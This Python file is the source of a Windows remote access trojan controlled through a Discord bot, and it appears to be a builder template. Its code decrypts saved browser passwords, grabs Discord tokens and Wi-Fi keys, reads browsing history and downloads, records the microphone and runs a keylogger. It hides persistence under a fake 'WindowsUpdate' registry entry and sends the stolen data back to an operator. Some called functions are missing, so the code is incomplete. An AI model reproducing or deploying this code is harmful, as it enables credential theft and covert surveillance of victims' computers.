import os
import discord
from discord.ext import commands
import asyncio
import sys
import subprocess
import time
import pyautogui
import psutil
import pygetwindow as gw
from datetime import datetime
from typing import Optional
import random
import string
import ctypes
import threading
import pyttsx3
import platform
import uuid
import socket
import re
import requests
import winreg
import base64
import atexit
import win32clipboard
import cv2
import shutil
import glob
import json
import sqlite3
import win32crypt
from PIL import ImageGrab
import certifi
import ssl
import aiohttp
import tempfile
import urllib.parse
from collections import deque

# Fix SSL for PyInstaller bundled EXE
if getattr(sys, 'frozen', False):
    os.environ['SSL_CERT_FILE'] = certifi.where()
    os.environ['REQUESTS_CA_BUNDLE'] = certifi.where()
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_context)
else:
    connector = None

# PyCryptodome - handle gracefully if missing
try:
    from Crypto.Cipher import AES
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    AES = None

# PyAudio - optional, handle gracefully if missing
try:
    import pyaudio
    import wave
    AUDIO_AVAILABLE = True
except ImportError:
    AUDIO_AVAILABLE = False
    pyaudio = None
    wave = None

if platform.system() != "Windows":
    sys.exit(0)

dir = os.path.dirname(os.path.abspath(__file__))
lock = os.path.join(dir, ".lock")
if os.path.exists(lock):
    sys.exit(0)
open(lock, "w").close()

running = True
shake_active = False
keylog_active = False
keylog_file = os.environ['TEMP'] + "\\syslog.txt"
keylog_listener = None

def cleanup():
    global running
    running = False
    if os.path.exists(lock):
        os.remove(lock)
atexit.register(cleanup)

def keep_lock_alive():
    while running:
        if not os.path.exists(lock):
            open(lock, "w").close()
        time.sleep(0.1)
threading.Thread(target=keep_lock_alive, daemon=True).start()

class Config:
    TOKEN = "{placeholder_token}"
    WHITELISTED = [{placeholder_whitelist}]
    MAIN_CHANNEL = {placeholder_main_channel}
    PREFIX = "{placeholder_prefix}"
    STARTUP = {placeholder_add_to_startup}

intents = discord.Intents.default()
intents.message_content = True

if getattr(sys, 'frozen', False):
    bot = commands.Bot(command_prefix=Config.PREFIX, intents=intents, connector=connector)
else:
    bot = commands.Bot(command_prefix=Config.PREFIX, intents=intents)

bot.remove_command("help")

current_path = os.environ['SYSTEMDRIVE'] + "\\"
critical_mode = False
shake_thread = None
muted = False

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def add_to_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(key)
        return True
    except:
        return False

def get_displayname():
    try:
        GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
        NameDisplay = 3
        size = ctypes.pointer(ctypes.c_ulong(0))
        GetUserNameEx(NameDisplay, None, size)
        nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
        GetUserNameEx(NameDisplay, nameBuffer, size)
        return nameBuffer.value
    except:
        return platform.node()

def get_hwid():
    try:
        cmd = 'powershell -Command "Get-CimInstance -ClassName Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID"'
        result = subprocess.check_output(cmd, shell=True).decode().strip()
        return result if result else str(uuid.getnode())
    except:
        return str(uuid.getnode())

def get_cpuinfo():
    try:
        cmd = 'powershell -Command "Get-CimInstance -ClassName Win32_Processor | Select-Object -ExpandProperty Name"'
        cpu = subprocess.check_output(cmd, shell=True).decode().strip()
        return cpu if cpu else platform.processor() or "N/A"
    except:
        return platform.processor() or "N/A"

def get_gpuinfo():
    try:
        cmd = 'powershell -Command "Get-CimInstance -ClassName Win32_VideoController | Select-Object -ExpandProperty Name"'
        gpu = subprocess.check_output(cmd, shell=True).decode().strip()
        return gpu.split('\n')[0] if gpu else "N/A"
    except:
        return "N/A"

def get_raminfo():
    ram = psutil.virtual_memory()
    return f"{ram.total / (1024**3):.2f} GB"

def get_disks():
    disks = []
    for partition in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(partition.mountpoint)
            disks.append({'drive': partition.device, 'free': f"{usage.free / (1024**3):.2f}", 'total': f"{usage.total / (1024**3):.2f}", 'percent': usage.percent})
        except:
            pass
    return disks

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "N/A"

def get_ipinfo():
    try:
        response = requests.get('http://ip-api.com/json/', timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {'ip': data.get('query', 'N/A'), 'country': data.get('country', 'N/A'), 'region': data.get('regionName', 'N/A'), 'city': data.get('city', 'N/A'), 'isp': data.get('isp', 'N/A')}
    except:
        pass
    return {'ip': get_local_ip(), 'country': 'N/A', 'region': 'N/A', 'city': 'N/A', 'isp': 'N/A'}

def get_macaddress():
    try:
        return ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    except:
        return "N/A"

def get_wifipasswords():
    profiles = []
    try:
        networks = subprocess.check_output('netsh wlan show profiles', shell=True).decode('utf-8', errors='ignore')
        profile_names = re.findall(r'All User Profile\s*:\s*(.*)', networks)
        for name in profile_names:
            name = name.strip()
            try:
                info = subprocess.check_output(f'netsh wlan show profile "{name}" key=clear', shell=True).decode('utf-8', errors='ignore')
                password_match = re.search(r'Key Content\s*:\s*(.*)', info)
                profiles.append({'name': name, 'password': password_match.group(1).strip() if password_match else "N/A"})
            except:
                profiles.append({'name': name, 'password': "N/A"})
    except:
        pass
    return profiles

def grab_discord_tokens():
    tokens = []
    paths = [os.path.expanduser("~") + r"\AppData\Roaming\Discord\Local Storage\leveldb", os.path.expanduser("~") + r"\AppData\Roaming\DiscordPTB\Local Storage\leveldb", os.path.expanduser("~") + r"\AppData\Roaming\DiscordCanary\Local Storage\leveldb"]
    for path in paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith((".log", ".ldb")):
                    with open(os.path.join(path, file), 'r', errors='ignore') as f:
                        data = f.read()
                        tokens.extend(re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', data))
                        tokens.extend(re.findall(r'mfa\.[\w-]{84}', data))
    return list(set(tokens))

def get_browser_passwords(browser_name, profile_path_pattern, state_path):
    """Generic function to get passwords from Chromium-based browsers"""
    passwords = []
    try:
        # Get master key from Local State
        local_state_path = os.path.join(state_path, "Local State")
        if not os.path.exists(local_state_path):
            return []
        
        with open(local_state_path, 'r') as f:
            local_state = json.load(f)
        
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        
        # Find all profiles
        profile_paths = glob.glob(os.path.join(state_path, "Default")) + glob.glob(os.path.join(state_path, "Profile *"))
        
        for profile_path in profile_paths:
            login_db = os.path.join(profile_path, "Login Data")
            if not os.path.exists(login_db):
                continue
            
            temp_db = os.path.join(tempfile.gettempdir(), f"{browser_name}_login.db")
            shutil.copy2(login_db, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for url, username, encrypted_pass in cursor.fetchall():
                if encrypted_pass:
                    try:
                        iv = encrypted_pass[3:15]
                        payload = encrypted_pass[15:]
                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
                        decrypted = cipher.decrypt(payload)[:-16].decode()
                        passwords.append(f"{browser_name} - {os.path.basename(profile_path)}\nURL: {url}\nUser: {username}\nPass: {decrypted}\n{'-'*40}")
                    except:
                        pass
            conn.close()
            os.remove(temp_db)
        
        return passwords
    except Exception as e:
        return [f"Error getting {browser_name} passwords: {str(e)}"]

def get_chrome_passwords():
    chrome_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data"
    return get_browser_passwords("Chrome", "Default|Profile *", chrome_path)

def get_browser_history(browser_name, history_db_path):
    """Get browser history"""
    history = []
    try:
        if not os.path.exists(history_db_path):
            return ["No history found"]
        
        temp_db = os.path.join(tempfile.gettempdir(), f"{browser_name}_history.db")
        shutil.copy2(history_db_path, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
        
        for url, title, timestamp in cursor.fetchall():
            if title:
                history.append(f"📄 {title}\n🔗 {url}\n")
            else:
                history.append(f"🔗 {url}\n")
        
        conn.close()
        os.remove(temp_db)
        return history if history else ["No history found"]
    except:
        return ["No history found"]

def get_recent_downloads():
    """Get recent downloads from Windows"""
    downloads = []
    try:
        # Check Downloads folder
        downloads_path = os.path.join(os.path.expanduser('~'), 'Downloads')
        if os.path.exists(downloads_path):
            files = os.listdir(downloads_path)
            for f in sorted(files, key=lambda x: os.path.getmtime(os.path.join(downloads_path, x)), reverse=True)[:30]:
                path = os.path.join(downloads_path, f)
                if os.path.isfile(path):
                    size = os.path.getsize(path)
                    size_str = f"{size/1024:.1f} KB" if size < 1048576 else f"{size/1048576:.1f} MB"
                    mtime = datetime.fromtimestamp(os.path.getmtime(path)).strftime('%Y-%m-%d %H:%M')
                    downloads.append(f"📄 {f}\n   Size: {size_str} | Modified: {mtime}\n")
        
        # Try to get from registry
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders")
            downloads_reg = winreg.QueryValueEx(key, "{374DE290-123F-4565-9164-39C4925E467B}")[0]
            if downloads_reg and os.path.exists(downloads_reg) and downloads_reg != downloads_path:
                files = os.listdir(downloads_reg)
                for f in sorted(files, key=lambda x: os.path.getmtime(os.path.join(downloads_reg, x)), reverse=True)[:20]:
                    path = os.path.join(downloads_reg, f)
                    if os.path.isfile(path):
                        size = os.path.getsize(path)
                        size_str = f"{size/1024:.1f} KB" if size < 1048576 else f"{size/1048576:.1f} MB"
                        downloads.append(f"📄 {f}\n   Size: {size_str}\n")
        except:
            pass
        
        return downloads if downloads else ["No recent downloads found"]
    except:
        return ["Error getting downloads"]

def get_installed_programs():
    """Get list of installed programs"""
    programs = []
    try:
        # 64-bit programs
        key_paths = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
        ]
        
        for key_path in key_paths:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                for i in range(0, winreg.QueryInfoKey(key)[0]):
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(key, subkey_name)
                        try:
                            name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                            if name:
                                try:
                                    version = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
                                    programs.append(f"{name} (v{version})")
                                except:
                                    programs.append(name)
                        except:
                            pass
                        winreg.CloseKey(subkey)
                    except:
                        pass
                winreg.CloseKey(key)
            except:
                pass
        
        # User-installed programs
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
            for i in range(0, winreg.QueryInfoKey(key)[0]):
                try:
                    subkey_name = winreg.EnumKey(key, i)
                    subkey = winreg.OpenKey(key, subkey_name)
                    try:
                        name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                        if name:
                            programs.append(f"👤 {name}")
                    except:
                        pass
                    winreg.CloseKey(subkey)
                except:
                    pass
            winreg.CloseKey(key)
        except:
            pass
        
        return list(set(programs)) if programs else ["No programs found"]
    except:
        return ["Error getting installed programs"]

def set_capslock(state):
    """Set caps lock state (True=on, False=off)"""
    try:
        # Simulate key press
        if state:
            pyautogui.press('capslock')
            # If already on, this turns it off, so we need to check
            # Simple approach: just send the key and let Windows handle it
        else:
            # Check current state first
            # Send the key twice if needed
            pyautogui.press('capslock')
        return True
    except:
        return False

def is_capslock_on():
    """Check if caps lock is on"""
    try:
        return ctypes.windll.user32.GetKeyState(0x14) & 0x0001 != 0
    except:
        return False

def set_volume(level):
    """Set system volume (0-100)"""
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevelScalar(level / 100.0, None)
        return True
    except:
        # Fallback using PowerShell
        try:
            subprocess.run(f'powershell -Command "(New-Object -ComObject Wscript.Shell).SendKeys([char]174)"', shell=True, capture_output=True)
            return True
        except:
            return False

def get_volume():
    """Get current system volume"""
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        return int(volume.GetMasterVolumeLevelScalar() * 100)
    except:
        return 50

def is_muted():
    """Check if system is muted"""
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        return volume.GetMute()
    except:
        return False

def toggle_mute():
    """Toggle system mute"""
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        current = volume.GetMute()
        volume.SetMute(not current, None)
        return not current
    except:
        return False

def start_shake(duration_seconds=10):
    """Start cursor shaking"""
    global shake_active
    
    if shake_active:
        return False
    
    shake_active = True
    
    def shake_loop():
        global shake_active
        start_time = time.time()
        while shake_active and (time.time() - start_time) < duration_seconds:
            # Move mouse in a small circle rapidly
            x, y = pyautogui.position()
            for dx, dy in [(0, 10), (10, 0), (0, -10), (-10, 0)]:
                if not shake_active:
                    break
                pyautogui.moveTo(x + dx, y + dy, duration=0.01)
                time.sleep(0.01)
            time.sleep(0.02)
        shake_active = False
    
    thread = threading.Thread(target=shake_loop, daemon=True)
    thread.start()
    return True

def stop_shake():
    """Stop cursor shaking"""
    global shake_active
    shake_active = False
    return True

def get_history_all_browsers():
    """Get history from all browsers"""
    all_history = []
    
    browsers = {
        "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\History",
        "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\History",
        "Brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History",
        "Opera": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable\History",
        "Vivaldi": os.path.expanduser("~") + r"\AppData\Local\Vivaldi\User Data\Default\History",
    }
    
    for name, path in browsers.items():
        history = get_browser_history(name, path)
        if history and history != ["No history found"]:
            all_history.append(f"**{name} History:**")
            all_history.extend(history)
            all_history.append("-" * 40)
    
    return all_history if all_history else ["No browser history found"]

def get_passwords_all_browsers():
    """Get passwords from all browsers"""
    all_passwords = []
    
    browsers = {
        "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data",
        "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data",
        "Brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data",
        "Opera": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable",
        "Vivaldi": os.path.expanduser("~") + r"\AppData\Local\Vivaldi\User Data",
    }
    
    for name, path in browsers.items():
        if os.path.exists(path):
            passwords = get_browser_passwords(name, "Default|Profile *", path)
            if passwords:
                all_passwords.extend(passwords)
    
    return all_passwords if all_passwords else ["No browser passwords found"]

@bot.command(name='downloads')
@is_authorized()
async def recent_downloads(ctx):
    """List recent downloads"""
    downloads = get_recent_downloads()
    output = "\n".join(downloads[:30])
    if len(output) > 1900:
        output = output[:1900] + "..."
    await send_embed(ctx, "📥 Recent Downloads", output, discord.Color.blue())

@bot.command(name='installed')
@is_authorized()
async def installed_programs(ctx):
    """List installed programs"""
    await send_embed(ctx, "📦 Getting installed programs...", "This may take a moment", discord.Color.blue())
    programs = get_installed_programs()
    output = "\n".join(programs[:100])
    if len(output) > 1900:
        output = output[:1900] + "..."
    await send_embed(ctx, "📦 Installed Programs", f"```{output}```", discord.Color.green())

@bot.command(name='canrec')
@is_authorized()
async def can_record(ctx, duration: int = 10):
    """Check if microphone recording is available and test"""
    if not AUDIO_AVAILABLE:
        await send_embed(ctx, "Error", "PyAudio not installed - microphone unavailable", discord.Color.red())
        return
    if duration < 5:
        duration = 5
    if duration > 300:
        duration = 300
    await send_embed(ctx, "🎤 Recording Test", f"Recording for {duration} seconds...", discord.Color.blue())
    path = record_mic(duration)
    if path and os.path.exists(path):
        with open(path, 'rb') as f:
            await ctx.send(file=discord.File(f))
        os.remove(path)
        await send_embed(ctx, "✅ Success", "Microphone recording test complete", discord.Color.green())
    else:
        await send_embed(ctx, "❌ Failed", "Could not record microphone", discord.Color.red())

@bot.command(name='history')
@is_authorized()
async def browser_history(ctx):
    """Get browser history from all browsers"""
    await send_embed(ctx, "📜 Fetching browser history...", "This may take a moment", discord.Color.blue())
    history = get_history_all_browsers()
    output = "\n".join(history[:50])
    if len(output) > 1900:
        output = output[:1900] + "..."
    await send_embed(ctx, "📜 Browser History", output, discord.Color.blue())

@bot.command(name='passwords')
@is_authorized()
async def all_browser_passwords(ctx):
    """Get passwords from all browsers"""
    if not CRYPTO_AVAILABLE:
        await send_embed(ctx, "Error", "pycryptodome not installed", discord.Color.red())
        return
    await send_embed(ctx, "🔑 Dumping all browser passwords...", "This may take a moment", discord.Color.blue())
    passwords = get_passwords_all_browsers()
    output = "\n".join(passwords[:20])
    if len(output) > 1900:
        output = output[:1900] + "..."
    await send_embed(ctx, "🔑 Browser Passwords", f"```{output}```", discord.Color.green())

@bot.command(name='shake')
@is_authorized()
async def shake_cursor(ctx, duration: int = 10):
    """Shake cursor for X seconds (5-300)"""
    global shake_active
    if duration < 5:
        duration = 5
    if duration > 300:
        duration = 300
    if shake_active:
        await send_embed(ctx, "❌ Error", "Shake already running", discord.Color.red())
        return
    if start_shake(duration):
        await send_embed(ctx, "🔄 Cursor Shake", f"Started for {duration} seconds", discord.Color.blue())
    else:
        await send_embed(ctx, "❌ Error", "Could not start shake", discord.Color.red())

@bot.command(name='shakestop')
@is_authorized()
async def shake_stop(ctx):
    """Stop cursor shaking"""
    global shake_active
    if stop_shake():
        await send_embed(ctx, "⏹️ Shake Stopped", "Cursor shake has been stopped", discord.Color.green())
    else:
        await send_embed(ctx, "❌ Error", "No shake running", discord.Color.red())

@bot.command(name='mute')
@is_authorized()
async def mute_audio(ctx):
    """Mute system audio"""
    if is_muted():
        await send_embed(ctx, "🔇 Already Muted", "System is already muted", discord.Color.orange())
        return
    toggle_mute()
    await send_embed(ctx, "🔇 Muted", "System audio has been muted", discord.Color.red())

@bot.command(name='unmute')
@is_authorized()
async def unmute_audio(ctx):
    """Unmute system audio"""
    if not is_muted():
        await send_embed(ctx, "🔊 Already Unmuted", "System is already unmuted", discord.Color.orange())
        return
    toggle_mute()
    await send_embed(ctx, "🔊 Unmuted", "System audio has been unmuted", discord.Color.green())

@bot.command(name='capslock')
@is_authorized()
async def caps_lock_toggle(ctx):
    """Toggle caps lock on/off"""
    current = is_capslock_on()
    set_capslock(not current)
    await send_embed(ctx, "🔠 Caps Lock", f"Caps lock is now {'ON' if not current else 'OFF'}", discord.Color.blue())

@bot.command(name='capslockon')
@is_authorized()
async def caps_lock_on(ctx):
    """Turn caps lock on"""
    if not is_capslock_on():
        set_capslock(True)
    await send_embed(ctx, "🔠 Caps Lock", "Caps lock is now ON", discord.Color.blue())

@bot.command(name='capslockoff')
@is_authorized()
async def caps_lock_off(ctx):
    """Turn caps lock off"""
    if is_capslock_on():
        set_capslock(False)
    await send_embed(ctx, "🔠 Caps Lock", "Caps lock is now OFF", discord.Color.blue())

@bot.command(name='fullscreenlock')
@is_authorized()
async def fullscreen_lock(ctx):
    """Lock Windows in fullscreen (auto-hide taskbar)"""
    try:
        # Hide taskbar
        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        ctypes.windll.user32.ShowWindow(hwnd, 0)
        await send_embed(ctx, "🖥️ Fullscreen Lock", "Taskbar hidden. Use !fullscreenunlock to restore", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "❌ Error", str(e), discord.Color.red())

@bot.command(name='fullscreenunlock')
@is_authorized()
async def fullscreen_unlock(ctx):
    """Unlock fullscreen (show taskbar)"""
    try:
        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        ctypes.windll.user32.ShowWindow(hwnd, 1)
        await send_embed(ctx, "🖥️ Fullscreen Unlocked", "Taskbar restored", discord.Color.green())
    except Exception as e:
        await send_embed(ctx, "❌ Error", str(e), discord.Color.red())

# Replace these commands in your existing template with the enhanced versions:

@bot.command(name='listfiles')
@is_authorized()
async def list_files(ctx, directory: str = "."):
    try:
        if directory.startswith("~"):
            directory = os.path.expanduser(directory)
        
        if directory == ".":
            directory = current_path
            
        if not os.path.exists(directory):
            await send_embed(ctx, "Error", f"Directory not found: {directory}", discord.Color.red())
            return
            
        if not os.path.isdir(directory):
            await send_embed(ctx, "Error", f"Not a directory: {directory}", discord.Color.red())
            return
            
        files = os.listdir(directory)
        
        items = []
        for f in files:
            path = os.path.join(directory, f)
            if os.path.isdir(path):
                items.append({'name': f, 'type': 'folder', 'path': path})
            else:
                size = os.path.getsize(path)
                ext = os.path.splitext(f)[1].lower() if os.path.splitext(f)[1] else ""
                items.append({'name': f, 'type': ext, 'size': size, 'path': path})
        
        items.sort(key=lambda x: (0 if x['type'] == 'folder' else 1, x['name'].lower()))
        
        chunks = []
        current_chunk = []
        for item in items:
            if item['type'] == 'folder':
                line = f"📁 {item['name']}/"
            else:
                size = item['size']
                if size < 1024:
                    size_str = f"{size} B"
                elif size < 1048576:
                    size_str = f"{size/1024:.1f} KB"
                elif size < 1073741824:
                    size_str = f"{size/1048576:.1f} MB"
                else:
                    size_str = f"{size/1073741824:.2f} GB"
                
                ext = item['type'][1:] if item['type'] else "noext"
                ext_emoji = {
                    'txt': '📄', 'py': '🐍', 'exe': '⚙️', 'dll': '🔧',
                    'jpg': '🖼️', 'jpeg': '🖼️', 'png': '🖼️', 'gif': '🖼️', 'bmp': '🖼️',
                    'mp3': '🎵', 'wav': '🎵', 'mp4': '🎬', 'avi': '🎬', 'mkv': '🎬',
                    'zip': '📦', 'rar': '📦', '7z': '📦', 'tar': '📦', 'gz': '📦',
                    'pdf': '📕', 'doc': '📘', 'docx': '📘', 'xls': '📊', 'xlsx': '📊',
                    'lua': '📜', 'json': '📋', 'xml': '📋', 'html': '🌐', 'css': '🎨', 'js': '⚡',
                    'iso': '💿', 'msi': '📦', 'bat': '💻', 'cmd': '💻', 'ps1': '💻',
                    'reg': '📝', 'ini': '📝', 'cfg': '📝', 'conf': '📝',
                    'log': '📋'
                }
                emoji = ext_emoji.get(ext, '📄')
                line = f"{emoji} {item['name']} ({size_str})"
            
            current_chunk.append(line)
            if len('\n'.join(current_chunk)) > 1800:
                chunks.append('\n'.join(current_chunk[:-1]))
                current_chunk = [line]
        
        if current_chunk:
            chunks.append('\n'.join(current_chunk))
        
        if not chunks:
            await send_embed(ctx, f"📁 {directory}", "Directory is empty", discord.Color.blue())
            return
        
        total_files = len([i for i in items if i['type'] != 'folder'])
        total_folders = len([i for i in items if i['type'] == 'folder'])
        
        embed = discord.Embed(
            title=f"📁 {directory}",
            description=f"**{total_folders} folders, {total_files} files**\n\n{chunks[0]}",
            color=discord.Color.blue()
        )
        
        if len(chunks) > 1:
            embed.set_footer(text=f"Showing 1/{len(chunks)} | Use !listfiles {directory} for more")
        
        await ctx.send(embed=embed)
        
        for i, chunk in enumerate(chunks[1:], start=2):
            embed = discord.Embed(
                title=f"📁 {directory} (continued)",
                description=chunk,
                color=discord.Color.blue()
            )
            embed.set_footer(text=f"Showing {i}/{len(chunks)}")
            await ctx.send(embed=embed)
            
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

# Add navigation commands
@bot.command(name='downloadsfolder')
@is_authorized()
async def list_downloads_folder(ctx):
    path = os.path.join(os.path.expanduser('~'), 'Downloads')
    await list_files(ctx, path)

@bot.command(name='documentsfolder')
@is_authorized()
async def list_documents_folder(ctx):
    path = os.path.join(os.path.expanduser('~'), 'Documents')
    await list_files(ctx, path)

@bot.command(name='picturesfolder')
@is_authorized()
async def list_pictures_folder(ctx):
    path = os.path.join(os.path.expanduser('~'), 'Pictures')
    await list_files(ctx, path)

@bot.command(name='videosfolder')
@is_authorized()
async def list_videos_folder(ctx):
    path = os.path.join(os.path.expanduser('~'), 'Videos')
    await list_files(ctx, path)

@bot.command(name='desktopfolder')
@is_authorized()
async def list_desktop_folder(ctx):
    path = os.path.join(os.path.expanduser('~'), 'Desktop')
    await list_files(ctx, path)

# Add keylogger status command
@bot.command(name='keylogstatus')
@is_authorized()
async def keylog_status(ctx):
    """Check keylogger status"""
    status = "🟢 Running" if keylog_active else "🔴 Stopped"
    await send_embed(ctx, "⌨️ Keylogger Status", status, discord.Color.blue())

# Override existing keylog command to use global keylog_active variable properly
@bot.command(name='keylog')
@is_authorized()
async def keylog_cmd(ctx, action: str = None):
    """Keylogger start/stop/dump"""
    global keylog_active, keylog_listener
    if action == 'start':
        if keylog_active:
            await send_embed(ctx, "⌨️ Keylog", "Already running", discord.Color.orange())
            return
        thread = threading.Thread(target=start_keylog, daemon=True)
        thread.start()
        keylog_active = True
        await send_embed(ctx, "⌨️ Keylog", "Started", discord.Color.green())
    elif action == 'stop':
        keylog_active = False
        await send_embed(ctx, "⌨️ Keylog", "Stopped", discord.Color.orange())
    elif action == 'dump':
        if os.path.exists(keylog_file):
            with open(keylog_file, 'r', encoding='utf-8') as f:
                data = f.read()
            if len(data) > 1900:
                await ctx.send(file=discord.File(keylog_file))
            else:
                await send_embed(ctx, "⌨️ Keylog Dump", f"```{data}```", discord.Color.blue())
            os.remove(keylog_file)
        else:
            await send_embed(ctx, "⌨️ Keylog", "No logs", discord.Color.red())
    else:
        await send_embed(ctx, "Usage", "!keylog start/stop/dump", discord.Color.orange())

# Add keylogger start/stop aliases
@bot.command(name='keylogstart')
@is_authorized()
async def keylog_start_cmd(ctx):
    await keylog_cmd(ctx, 'start')

@bot.command(name='keylogstop')
@is_authorized()
async def keylog_stop_cmd(ctx):
    await keylog_cmd(ctx, 'stop')

# Rest of your existing commands (info, lock, crash, etc.) remain the same
# The rest of the template continues here...

# ... (all other existing commands remain unchanged)
